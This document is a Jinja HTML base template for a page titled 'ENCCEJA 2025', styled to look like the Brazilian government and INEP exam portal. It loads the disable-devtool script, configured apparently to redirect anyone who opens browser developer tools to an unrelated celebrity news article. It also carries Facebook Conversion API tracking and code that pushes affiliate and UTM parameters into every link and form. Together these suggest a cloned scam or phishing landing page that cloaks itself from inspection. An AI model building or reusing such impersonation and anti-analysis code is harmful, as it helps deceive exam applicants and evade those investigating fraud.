<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>{% block title %}ENCCEJA 2025{% endblock %}</title>
    
    {% if not developing %}
    <script
        disable-devtool-auto
        src='https://cdn.jsdelivr.net/npm/disable-devtool'
        url='https://revistaquem.globo.com/saude/fitness/noticia/2025/03/jojo-todynho-fala-sobre-processo-de-emagrecimento.ghtml'
        tk-name='xxx'
        interval='100'
        detectors='all'
        clear-log='true'
    ></script>
    {% endif %}
    
    <link rel="stylesheet" href="/static/css/rawline-fonts.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    
    {% block head_scripts %}{% endblock %}
    
    <!-- Scripts de debug para Facebook CAPI e rastreamento UTM -->
    {% if show_fb_debugger %}
        {% include 'includes/fb_pixel_debug.html' %}
    {% endif %}
    
    <!-- Injetar scripts de debug do Facebook Conversion API -->
    {{ fb_debug_scripts|safe }}
    
    <style>
        .gov-header {
            background-color: #222222;
        }
        .inep-header {
            background-color: #044785;
        }
        .encceja-color {
            color: #3b5998;
        }
        .encceja-light {
            color: #a0a0a0;
        }
        .form-header {
            background-color: #2c5985;
            color: white;
        }
        .form-footer {
            background-color: #5d85ab;
            color: white;
        }

        button#submit-button {
            transition: all 0.2s ease;
            background-color: #5d85ab;
            color: rgba(255, 255, 255, 0.6);
        }

        button#submit-button:not([disabled]) {
            color: white;
            cursor: pointer;
        }

        button#submit-button:not([disabled]):hover {
            background-color: #4d7396;
        }
        .required-star {
            color: #ff0000;
        }
        .footer-bg {
            background-color: #1c2b39;
        }
        input::placeholder {
            font-family: 'Rawline', Arial, sans-serif;
        }
        .selected {
            border: 4px dashed #2B7A9A !important;
        }
        .transparent {
            opacity: 0.5;
        }
        {% block additional_styles %}{% endblock %}
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">
    {% block content %}{% endblock %}
    
    {% block footer_scripts %}{% endblock %}
    
    <!-- Script para preservar parâmetros UTM em todas as navegações -->
    <script>
    (function() {
        // Função para obter parâmetros UTM da URL atual
        function getUtmParamsFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            const utmParams = {};
            
            // Lista de parâmetros UTM a serem preservados
            const utmKeys = [
                'utm_source', 'utm_medium', 'utm_campaign', 
                'utm_content', 'utm_term', 'fbclid', 
                'gclid', 'ttclid', 'src', 'sck', 'xcod'
            ];
            
            // Coletar parâmetros UTM presentes na URL
            utmKeys.forEach(key => {
                if (urlParams.has(key)) {
                    utmParams[key] = urlParams.get(key);
                }
            });
            
            return utmParams;
        }
        
        // Função para salvar parâmetros UTM no localStorage
        function saveUtmParamsToStorage(params) {
            if (Object.keys(params).length > 0) {
                localStorage.setItem('utm_params', JSON.stringify(params));
                console.log('UTM params saved to storage:', params);
            }
        }
        
        // Função para obter parâmetros UTM do localStorage
        function getUtmParamsFromStorage() {
            const storedParams = localStorage.getItem('utm_params');
            return storedParams ? JSON.parse(storedParams) : {};
        }
        
        // Função para adicionar parâmetros UTM a links internos
        function addUtmParamsToLinks(params) {
            if (Object.keys(params).length === 0) return;
            
            // Selecionar todos os links internos
            const links = document.querySelectorAll('a');
            
            links.forEach(link => {
                try {
                    // Ignorar links externos, âncoras vazias ou links de telefone/email
                    if (!link.href || 
                        link.href.startsWith('tel:') || 
                        link.href.startsWith('mailto:') || 
                        link.getAttribute('href') === '#' ||
                        (link.href.indexOf('//') !== -1 && link.href.indexOf(window.location.host) === -1)) {
                        return;
                    }
                    
                    // Criar URL a partir do href
                    const url = new URL(link.href);
                    
                    // Verificar se é um link interno
                    if (url.host === window.location.host) {
                        // Adicionar parâmetros UTM
                        const searchParams = new URLSearchParams(url.search);
                        
                        // Adicionar apenas parâmetros que não existem já na URL
                        Object.entries(params).forEach(([key, value]) => {
                            if (!searchParams.has(key)) {
                                searchParams.set(key, value);
                            }
                        });
                        
                        // Atualizar a URL do link
                        url.search = searchParams.toString();
                        link.href = url.toString();
                    }
                } catch (e) {
                    console.error('Error processing link:', link.href, e);
                }
            });
        }
        
        // Função para adicionar parâmetros UTM a formulários
        function addUtmParamsToForms(params) {
            if (Object.keys(params).length === 0) return;
            
            // Selecionar todos os formulários
            const forms = document.querySelectorAll('form');
            
            forms.forEach(form => {
                // Adicionar campos hidden para cada parâmetro UTM
                Object.entries(params).forEach(([key, value]) => {
                    // Verificar se o campo já existe
                    const existingField = form.querySelector(`input[name="${key}"]`);
                    
                    if (!existingField) {
                        const hiddenField = document.createElement('input');
                        hiddenField.type = 'hidden';
                        hiddenField.name = key;
                        hiddenField.value = value;
                        form.appendChild(hiddenField);
                    }
                });
            });
        }
        
        // Inicialização
        document.addEventListener('DOMContentLoaded', function() {
            // Obter parâmetros UTM da URL atual
            const urlUtmParams = getUtmParamsFromUrl();
            
            // Obter parâmetros UTM armazenados
            const storedUtmParams = getUtmParamsFromStorage();
            
            // Combinar parâmetros, priorizando os da URL atual
            const combinedParams = { ...storedUtmParams, ...urlUtmParams };
            
            // Salvar parâmetros UTM combinados
            saveUtmParamsToStorage(combinedParams);
            
            // Aplicar parâmetros UTM aos links e formulários
            addUtmParamsToLinks(combinedParams);
            addUtmParamsToForms(combinedParams);
            
            // Adicionar observer para modificações no DOM
            const observer = new MutationObserver(function(mutations) {
                addUtmParamsToLinks(combinedParams);
                addUtmParamsToForms(combinedParams);
            });
            
            // Configuração do observer (observar mudanças em childList e subtree)
            observer.observe(document.body, { 
                childList: true, 
                subtree: true 
            });
            
            console.log('UTM parameter preservation initialized');
            
            // Log detalhado para debug do rastreamento de UTM
            console.log('[UTM TRACKER] Sistema de preservação de UTM inicializado');
            console.log('[UTM TRACKER] UTMs da URL atual:', getUtmParamsFromUrl());
            console.log('[UTM TRACKER] UTMs armazenados:', getUtmParamsFromStorage());
        });
    })();
    </script>
</body>
</html>